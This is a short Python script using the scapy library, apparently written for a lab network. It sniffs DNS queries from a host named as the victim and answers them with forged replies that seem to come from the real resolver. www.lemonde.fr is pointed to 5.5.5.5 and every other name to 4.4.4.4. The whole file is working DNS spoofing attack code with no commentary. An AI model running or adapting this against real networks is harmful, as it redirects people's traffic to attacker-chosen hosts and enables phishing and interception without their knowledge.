#!/usr/bin/env python

from scapy.all import *

victim_addr = '10.0.0.22'
target_addr = '10.0.0.21'
target_ether_addr = '08:00:27:1b:31:f2'
target_iface = 'enp0s3'

def generate_fake_address(domain_name):
	if domain_name == 'www.lemonde.fr.':
		return '5.5.5.5'
	else:
		return '4.4.4.4'

def reply(p):
	if DNS in p:
		domain_name = p[DNS].qd.qname
		print domain_name
		redirect_addr = generate_fake_address(domain_name)
		dns = DNS(id=p[DNS].id,qr=1,rd=p[DNS].rd,ra=p[DNS].ra,qd=p[DNS].qd,an=DNSRR(rrname=domain_name,ttl=42,rdata=redirect_addr))
		p2 = Ether(dst=target_ether_addr)/IP(src=target_addr,dst=victim_addr)/UDP(sport=53,dport=p[UDP].sport)/dns
		sendp(p2, iface=target_iface)		


sniff(iface=target_iface, filter='src '+victim_addr+' and dst '+target_addr+' and udp port 53', prn=reply)